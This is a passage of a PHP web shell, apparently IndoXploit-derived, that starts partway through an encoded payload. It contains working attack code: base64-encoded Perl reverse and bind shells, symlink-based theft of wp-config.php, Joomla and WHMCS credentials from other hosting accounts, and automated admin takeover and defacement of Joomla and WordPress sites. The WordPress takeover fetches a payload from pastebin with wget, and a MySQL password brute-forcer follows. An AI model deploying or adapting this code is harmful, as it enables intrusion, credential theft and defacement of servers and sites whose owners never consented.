dC5wbCA8SG9zdD4gPFBvcnQ+XG4iOwogIGV4aXQoMSk7Cn0KcHJpbnQgIlsrXSBDb25uZWN0aW5n
IHRvICRob3N0XG4iOwokcHJvdCA9IGdldHByb3RvYnluYW1lKCd0Y3AnKTsgIyBZb3UgY2FuIGNo
YW5nZSB0aGlzIGlmIG5lZWRzIGJlCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFN
LCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTsKaWYgKCFjb25uZWN0
KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGll
KCJbLV0gVW5hYmxlIHRvIENvbm5lY3QgISIpO30KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOwog
IG9wZW4oU1RET1VULCI+JlNFUlZFUiIpOwogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOwogIGV4
ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow==";
$opbc=fopen("bcc.pl","w");
fwrite($opbc,base64_decode($bcperl));
fclose($opbc);
system("perl bcc.pl $ipbc $pbc") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function wbp($wb){
$wbp="dXNlIFNvY2tldDsKJHBvcnQJPSAkQVJHVlswXTsKJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3Rj
cCcpOwpzb2NrZXQoU0VSVkVSLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsKc2V0c29j
a29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgcGFjaygibCIsIDEpKTsKYmlu
ZChTRVJWRVIsIHNvY2thZGRyX2luKCRwb3J0LCBJTkFERFJfQU5ZKSk7Cmxpc3RlbihTRVJWRVIs
IFNPTUFYQ09OTik7CmZvcig7ICRwYWRkciA9IGFjY2VwdChDTElFTlQsIFNFUlZFUik7IGNsb3Nl
IENMSUVOVCkKewpvcGVuKFNURElOLCAiPiZDTElFTlQiKTsKb3BlbihTVERPVVQsICI+JkNMSUVO
VCIpOwpvcGVuKFNUREVSUiwgIj4mQ0xJRU5UIik7CnN5c3RlbSgnY21kLmV4ZScpOwpjbG9zZShT
VERJTik7CmNsb3NlKFNURE9VVCk7CmNsb3NlKFNUREVSUik7Cn0g";
$opwb=fopen("wbp.pl","w");
fwrite($opwb,base64_decode($wbp));
fclose($opwb);
echo getcwd();
system("perl wbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function lbp($wb){
$lbp="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7JHBvcnQ9JEFSR1ZbMF07JHByb3RvPWdldHByb3Rv
YnluYW1lKCd0Y3AnKTskY21kPSJscGQiOyQwPSRjbWQ7c29ja2V0KFNFUlZFUiwgUEZfSU5FVCwg
U09DS19TVFJFQU0sICRwcm90byk7c2V0c29ja29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JF
VVNFQUREUiwgcGFjaygibCIsIDEpKTtiaW5kKFNFUlZFUiwgc29ja2FkZHJfaW4oJHBvcnQsIElO
QUREUl9BTlkpKTtsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pO2Zvcig7ICRwYWRkciA9IGFjY2Vw
dChDTElFTlQsIFNFUlZFUik7IGNsb3NlIENMSUVOVCl7b3BlbihTVERJTiwgIj4mQ0xJRU5UIik7
b3BlbihTVERPVVQsICI+JkNMSUVOVCIpO29wZW4oU1RERVJSLCAiPiZDTElFTlQiKTtzeXN0ZW0o
Jy9iaW4vc2gnKTtjbG9zZShTVERJTik7Y2xvc2UoU1RET1VUKTtjbG9zZShTVERFUlIpO30g";
$oplb=fopen("lbp.pl","w");
fwrite($oplb,base64_decode($lbp));
fclose($oplb);
system("perl lbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}

if($_REQUEST['portbw']){
wbp($_REQUEST['portbw']);

}if($_REQUEST['portbl']){
lbp($_REQUEST['portbl']);
}
if($_REQUEST['ipcb'] && $_REQUEST['portbc']){
bcn($_REQUEST['ipcb'],$_REQUEST['portbc']);

}
echo "<p align='center'><font face='Tahoma' color='#007700' size='2pt' /><p align='center'><br>Ip : <input type=text name=ipcb value=".$_SERVER['REMOTE_ADDR'] ."> Port : <input type=text name=portbc value=5555> <input type=submit value=Connect></form>".$formp."<p align='center'><p align='center'><br><font face='Tahoma' color='#009900' size='2pt'> Windows Bind Port</font> <br>Port : <input type=text name=portbw value=5555> <input type=submit value=Connect></form>".$formp."<p align='center'> <br><font face='Tahoma' color='#009900' size='2pt'>Linux Bind Port</font> <br>Port : <input type=text name=portbl value=5555> <input type=submit value=Connect></form><br><br>".$end;exit;
}
////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'grabc')){ @ini_set('output_buffering',0); 
?>
    <form action="?y=<?php echo $pwd; ?>&x=grabc" method="post">
	<br><br><center><b><font size=4>Config Grabber !</font></b></center><br>
<?php
echo "
<form method='POST'>
</head>
<style>
textarea {
resize:none;
color: #000000 ;
background-color:#000000;  
font-size:8pt; color:#FFFF00;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>";
echo "<center>";?></center><br><center><?php if (empty($_POST['config'])) { ?><p><font face="Tahoma" color="#007700" size="2pt">/etc/passwd content</p><br><form method="POST"><textarea name="passwd" class='area' rows='15' cols='60'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><input name="config" class='inputzbut' size="100" value="Grab!" type="submit"><br></form></center><br><?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink disabled :( </error>');}@mkdir('jembutgrab', 0755);@chdir('jembutgrab');
$htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];
$passwd=explode("\n",$passwd);
echo "<br><br><center><font color=#b0b000 size=2pt>wait ...</center><br>";
foreach($passwd as $pwd){
$pawd=explode(":",$pwd);$user =$pawd[0];
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');
@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');
@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');
@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}
echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>Done -></b> <a target="_blank" href="jembutgrab">Open configs</a></font></b>';}
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'grabwpjm'))
			{
			?>
			<form action="?path=<?php echo $path; ?>&amp;x=grabwpjm" method="post">
<?php
// Tu5b0l3d
// thx to: IndoXPloit, HNc
// Config Wordpress and Joomla Grabber
error_reporting(0);
 echo "<h1><center>Created By IndoXploit<br><a href='configs/'style='text-decoration:none;'>Open Configs</a></center><br></h1>";
//$us = file_get_contents("/etc/passwd");
$usa = fopen('/etc/passwd','r');
$dir = mkdir('configs', 0777);
$rrrr = "Options all \n DirectoryIndex configs.html \n Require None \n Satisfy Any";
$frr = fopen('configs/.htaccess', 'w');

fwrite($frr, $rrrr);
while($us = fgets($usa)){
if($us==""){
    echo "cann't read /etc/passwd";
}
else{
preg_match_all('/(.*?):x:/', $us, $user_byk);

    foreach($user_byk[1] as $user){
        $dir1 = "/home/$user/public_html/";
        if(is_readable($dir1)){
            $dir = "/home/$user/public_html/wp-config.php";
            $dir2 = "/home/$user/public_html/configuration.php";
            $ambil = file_get_contents($dir);
            
        
            if($ambil==""){
                $ambil_joom = file_get_contents($dir2);
                if($ambil_joom==""){                
                  echo "<font color='green'>$user <= Readable (Bukan Wordpress dan Joomla)<br></font>";
                
            }
            else{

                $file1 = "grabwpjm/$user-configuration.txt";
                $fp2 = fopen($file1,"w");
                fputs($fp2,$ambil);

                echo "<a href='grabwpjm/$user-configuration.txt'style='text-decoration:none;'>$user </a> <= Joomla<br>";
                
            }
                
            }
            else{

                $file1 = "grabwpjm/$user-wpconfig.txt";
                $fp2 = fopen($file1,"w");
                fputs($fp2,$ambil);

                echo "<a href='grapwpjm/$user-wpconfig.txt'style='text-decoration:none;'>$user </a> <= Wordpress<br>";
                
            }


    }
        else{
            
             
        }

   }

}

}

}
elseif(isset($_GET['x']) && ($_GET['x'] == 'joom'))
			{
			?>
			<form action="?path=<?php echo $path; ?>&amp;x=joom" method="post">
<?php
error_reporting(0);
//Tu5b0l3d

//thx to: IndoXploit, Hacker-Newbie.org



    if($_POST['submitt']){
  

        $host = $_POST['host'];

        $username = $_POST['username'];

        $password = $_POST['password'];

        $db = $_POST['db'];

        $dbprefix = $_POST['dbprefix'];

        $user_baru = $_POST['user_baru'];

        $password_baru = $_POST['password_baru'];

        $tanya = $_POST['tanya'];


        $prefix = $dbprefix."users";

        $pass = md5("$password_baru");

        $upda = $db.".".$dbprefix;


        mysql_connect($host,$username,$password) or die("Koneksi gagal.. isi data yg bener");

        mysql_select_db($db) or die("Database tidak bisa dibuka.. Isi data yg bener");

 $tampil=mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
    $r=mysql_fetch_array($tampil);
        $id = $r[id];
       

         mysql_query("UPDATE $prefix SET password='$pass',username='$user_baru' WHERE id='$id'");

        
                function token($target){
                    $ch2 = curl_init ("$target");
                    curl_setopt ($ch2, CURLOPT_RETURNTRANSFER, 1);
                   curl_setopt ($ch2, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt ($ch2, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                    curl_setopt ($ch2, CURLOPT_CONNECTTIMEOUT, 5);
                    curl_setopt ($ch2, CURLOPT_SSL_VERIFYPEER, 0);
                    curl_setopt ($ch2, CURLOPT_SSL_VERIFYHOST, 0);
                    curl_setopt($ch2, CURLOPT_COOKIEJAR,'coker_log');
                    curl_setopt($ch2, CURLOPT_COOKIEFILE,'coker_log');
                    $data = curl_exec ($ch2);
                   
                    
                        preg_match('/<input type="hidden" name="(.*?)" value="1"/', $data, $token);
                $token = $token[1];
                return $token;
            }
            
            if ($tanya == "y"){
                $target = $_POST['target'];
                $path = "/administrator/index.php?option=com_templates&view=template&id=503&file=L2Vycm9yLnBocA%3D%3D";
                $site = $target.$path;
                $token1 = token($site);


               
$post = array(
                    "username" => "$user_baru",
                    "passwd" => "$password_baru",
                    "lang" => "en-GB",
                    "option" => "com_login",
                    "task" => "login",
                    "return" => "aW5kZXgucGhw",
                    "$token1" => "1",
                    );

$ch = curl_init ("$site");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
@curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$masuk = curl_exec ($ch);

$token2 = token($site);

$upload = base64_decode("Z3cgZ2FudGVuZw0KPD9waHANCiAgJGZpbGUgPSAkX0ZJTEVTWydmaWxlJ107DQogICRuZXdmaWxlPSJrLnBocCI7DQoJCWlmIChmaWxlX2V4aXN0cygiLi4vLi4vIi4kbmV3ZmlsZSkpIHVubGluaygiLi4uLi8vIi4kbmV3ZmlsZSk7DQogICAgCW1vdmVfdXBsb2FkZWRfZmlsZSgkZmlsZVsndG1wX25hbWUnXSwgIi4uLy4uLyRuZXdmaWxlIik7DQo/Pg0K");

$post2 = array(
                    "jform[source]" => "$upload",
                    "task" => "template.save",
                    "$token2" => "1",
                    "jform[extension_id]"=> "503",
                    "jform[filename]" => "/error.php",
                    );

$ch3 = curl_init ("$site");
curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch3, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch3, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch3, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch3, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch3, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch3, CURLOPT_POST, 1);
curl_setopt ($ch3, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch3, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch3, CURLOPT_COOKIEFILE,'coker_log');
$masuk2 = curl_exec ($ch3);

if(preg_match("#successfully#is", $masuk2)){
echo "uploader udh ketanem...<br>";
echo "lanjut mepes...<br>";

$file_pepes = "hacked.php";
$ch4 =curl_init("$target/templates/beez3/error.php");
                            curl_setopt($ch4, CURLOPT_POST, true);
                            curl_setopt($ch4, CURLOPT_POSTFIELDS,
                            array('file'=>"@$file_pepes"));
                            curl_setopt($ch4, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt ($ch4, CURLOPT_SSL_VERIFYPEER, 0);
                            curl_setopt ($ch4, CURLOPT_SSL_VERIFYHOST, 0);
                            $postResult = curl_exec($ch4);
                            curl_close($ch4);


    $ch5 =curl_init("$target/k.php");
                            curl_setopt($ch5, CURLOPT_POST, true);
                            curl_setopt($ch5, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt ($ch5, CURLOPT_SSL_VERIFYPEER, 0);
                            curl_setopt ($ch5, CURLOPT_SSL_VERIFYHOST, 0);
                            $postResult2 = curl_exec($ch5);
                            

                     if(preg_match('#hacked#is', $postResult2)){
                        echo "<font color='green'>berhasil mepes...</font><br>";
                        echo "$target/k.php<br>";
                    }
                    else{
                        echo "<font color='red'>gagal mepes...</font><br>";
                        echo "coba aja manual: <br>";
                        echo "$target/administrator<br>";
                        echo "username: $user_baru<br>";
                        echo "password: $password_baru<br>";
                    }
                


}
else{
    echo "failed<br>";
    echo "data udh bener. beda template mungkin :(<br>";
    echo "coba aja manual: <br>";
    echo "$target/administrator<br>";
    echo "username: $user_baru<br>";
    echo "password: $password_baru<br>";
}


curl_close($ch3);
curl_close($ch);





            }
            elseif($tanya == "n"){
            echo "Sukses<br>";
            echo "username: $user_baru<br>";
            echo "password: $password_baru<br>";

            }
        

        }



        else{

            echo '<html>

    <head>

        <title>Edit user in joomla</title>

    </head>



    <body>

            <center>

                <center

                        <h2>Edit user in joomla</h2>

                        <table>

                            <tr><td><form method="post" action="?action"></td></tr>

                            <tr><td><input type="text" name="host" placeholder="localhost"></td></tr>

                            <tr><td><input type="text" name="username" placeholder="User DB"></td></tr>

                            <tr><td><input type="text" name="password" placeholder="Password DB"></td></tr>

                            <tr><td><input type="text" name="db" placeholder="Database"></td></tr>

                            <tr><td><input type="text" name="dbprefix" placeholder="dbprefix"></td></tr>

                            <tr><td><input type="text" name="user_baru" placeholder="Username Baru"></td></tr>

                            <tr><td><input type="text" name="password_baru" placeholder="Password Baru"></td></tr>
                            <tr><td></td></tr>
                            <tr><td></td></tr>
                          

                            <tr><td> Auto Deface <input type="radio" name="tanya" value="y"> y <input type="radio" name="tanya" value="n"> n</td></tr>
                             <tr><td><input type="text" name="target" placeholder="www.IndoXploit.org"></td></tr>

                            <tr><td><input type="submit" value="Submit" name="submitt"></td></tr>

                        </table>
                        *nb: Masukin script deface anda hacked.php. kalo milih y ... silahkan masukin nama sitenya, kalo ngk tau nama sitenya, pilih n

            </center>

    </body>';

        }



}
elseif(isset($_GET['x']) && ($_GET['x'] == 'ggwp'))
			{
			?>
			<form action="?path=<?php echo $path; ?>&amp;x=ggwp" method="post">
<?php
	if($_POST){
		$host = $_POST['host'];
		$username = $_POST['username'];
		$password = $_POST['password'];
		$db = $_POST['db'];
		$dbprefix = $_POST['dbprefix'];
		$user_baru = $_POST['user_baru'];
		$password_baru = $_POST['password_baru'];
		$prefix = $db.".".$dbprefix."users";
		$sue = $db.".".$dbprefix."options";
		 $tanya = $_POST['tanya'];
		 $target = $_POST['target'];
		 $nick = $_POST['nick'];
		$pass = md5("$password_baru");
		

		mysql_connect($host,$username,$password) or die("Koneksi gagal.. isi data yg bener");
		mysql_select_db($db) or die("Database tidak bisa dibuka.. Isi data yg bener");

		$tampil=mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
   		$r=mysql_fetch_array($tampil);
        $id = $r[ID];

        $tampil2=mysql_query("SELECT * FROM $sue ORDER BY option_id ASC");
   		$r2=mysql_fetch_array($tampil2);
        $target = $r2[option_value];
        

         mysql_query("UPDATE $prefix SET user_pass='$pass',user_login='$user_baru' WHERE ID='$id'");

         


			if($tanya=="y"){

	function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

	function anucurl($sites){
		$ch1 = curl_init ("$sites");
curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch1, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
$data = curl_exec ($ch1);
return $data;
	}

	function lohgin($cek, $web, $userr, $pass){
		$post = array(
					"log" => "$userr",
					"pwd" => "$pass",
					"rememberme" => "forever",
					"wp-submit" => "Log In",
					"redirect_to" => "$web/wp-admin/",
					"testcookie" => "1",
					);
$ch = curl_init ("$cek");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data6 = curl_exec ($ch);
return $data6;
	}

$site= "$target/wp-login.php";
$site2= "$target/wp-admin/theme-install.php?upload";
$a = lohgin($site, $target, $user_baru, $password_baru);
$b = lohgin($site2, $target, $user_baru, $password_baru);
			

$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
echo "# token -> $anu2<br>";


 system('wget http://pastebin.com/raw.php?i=mEQP6prW');
 system('cp raw.php?i=mEQP6prW m.php');
    
  $post2 = array(
					"_wpnonce" => "$anu2",
					"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
					"themezip" => "@m.php",
					"install-theme-submit" => "Install Now",
					);
$ch = curl_init ("$target/wp-admin/update.php?action=upload-theme");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);

$namafile = "wew.php";
$fp2 = fopen($namafile,"w");
fputs($fp2,$nick);

$y = date("Y");
$m = date("m");


$ch6 = curl_init("$target/wp-content/uploads/$y/$m/m.php");
curl_setopt($ch6, CURLOPT_POST, true);
curl_setopt($ch6, CURLOPT_POSTFIELDS,
array('file3'=>"@$namafile"));
curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch6, CURLOPT_COOKIEFILE, "coker_log");
$postResult = curl_exec($ch6);
curl_close($ch6);

$as = "$target/k.php";
$bs = file_get_contents($as);
 if(preg_match("#hacked#si",$bs)){
                        echo "# <font color='green'>berhasil mepes...</font><br>";
                        echo "# $target/k.php<br>";
                    }
                    else{
                        echo "# <font color='red'>gagal mepes...</font><br>";
                        echo "# coba aja manual: <br>";
                        echo "# $target/wp-login.php<br>";
                        echo "# username: $user_baru<br>";
                        echo "# password: $password_baru<br>";

                       
                    }




		}

		elseif($tanya=="n"){
			echo "# Sukses<br>";
            echo "# username: $user_baru<br>";
            echo "# password: $password_baru<br>";
		}



	}else{
			echo '<html>
	<head>
		<title>Wordpress Created New User</title>
	</head>

	<body>
			<center>
				<center><div id="button"></div>
						<h2>Wordpress Created New User</h2>
						<table>
							<tr><td><form method="post" action="?action"></td></tr>
							<tr><td><input type="text" name="host" placeholder="localhost"></td></tr>
							<tr><td><input type="text" name="username" placeholder="User DB"></td></tr>
							<tr><td><input type="text" name="password" placeholder="Password DB"></td></tr>
							<tr><td><input type="text" name="db" placeholder="Database"></td></tr>
							<tr><td><input type="text" name="dbprefix" placeholder="dbprefix"></td></tr>
							<tr><td><input type="text" name="user_baru" placeholder="Username Baru"></td></tr>
							<tr><td><input type="text" name="password_baru" placeholder="Password Baru"></td></tr>
							  <tr><td> Auto Deface <input type="radio" name="tanya" value="y"> y <input type="radio" name="tanya" value="n"> n</td></tr>
                           
                             <tr><td><input type="text" name="nick" placeholder="Hacked By Tu5b0l3d"></td></tr>
							<tr><td><input type="submit" value="Ganti"></td></tr>
						</table>
						*nb: kalo milih y ... silahkan Ganti Form Hacked By Tu5b0l3d jadi Hacked by Nick_ente
			</center>
	</body>';
		}

}

elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			{
			?>
			<form action="?path=<?php echo $path; ?>&amp;x=brute" method="post">
<?php

@set_time_limit(0);
@error_reporting(0);


if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "Zoo!! ~ user is (<b><font color=white>$user</font></b>) Password is (<b><font color=white>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>You Found <font color=red>$ok</font> Nice</b>";
    echo "<center><b><a href=".$_SERVER['PHP_SELF']."?brute>BACK</a>";
    exit;
}
}
if($_POST['pass']=='password'){
@error_reporting(0);
$i = getenv('REMOTE_ADDR');
$d = date('D, M jS, Y H:i',time());
$h = $_SERVER['HTTP_HOST'];
$dir=$_SERVER['PHP_SELF'];
mkdir('config',0755);
$cp =
'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCicnJw0KQnk6IEFobWVkIFNoYXdreSBha2EgbG54ZzMzaw0KdGh4OiBPYnp5LCBSZWxpaywgbW9oYWIgYW5kICNhcmFicHduIA0KJycnDQoNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IGdsb2INCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KDQppZiBsZW4oc3lzLmFyZ3YpICE9IDM6DQogIHByaW50JycnCQ0KIFVzYWdlOiAlcyBbVVJMLi4uXSBbZGlyZWN0b3J5Li4uXQ0KIEV4KSAlcyBodHRwOi8vd3d3LnRlc3QuY29tL3Rlc3QvIFtkaXIgLi4uXScnJyAlIChzeXMuYXJndlswXSwgc3lzLmFyZ3ZbMF0pDQogIHN5cy5leGl0KDEpDQoNCnNpdGUgPSBzeXMuYXJndlsxXQ0KZm91dCA9IHN5cy5hcmd2WzJdDQoNCnRyeToNCiAgcmVxICA9IHVybGxpYi51cmxvcGVuKHNpdGUpDQogIHJlYWQgPSByZXEucmVhZCgpDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAndycpDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KICBpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6DQogICAgZiA9IG9wZW4oJ2RhdGEudHh0JywgJ3cnKSAgDQogICAgZi53cml0ZShyZWFkKQ0KICAgIGYuY2xvc2UoKQ0KDQogIGkgPSAwDQogIGlmIHN5c3RlbSgpID09ICdMaW51eCc6DQogICAgZiA9IG9wZW4oJy90bXAvZGF0YS50eHQnLCAnclUnKQ0KICAgIGZvciBsaW5lIGluIGY6DQogICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoJzxsaT48YScpID09IFRydWUgOg0KICAgICAgICBtID0gcmUuc2VhcmNoKHInKDxhIGhyZWY9IikoLitbXj5dKSgiPiknLCBsaW5lKQ0KICAgICAgICBpICs9IDENCiAg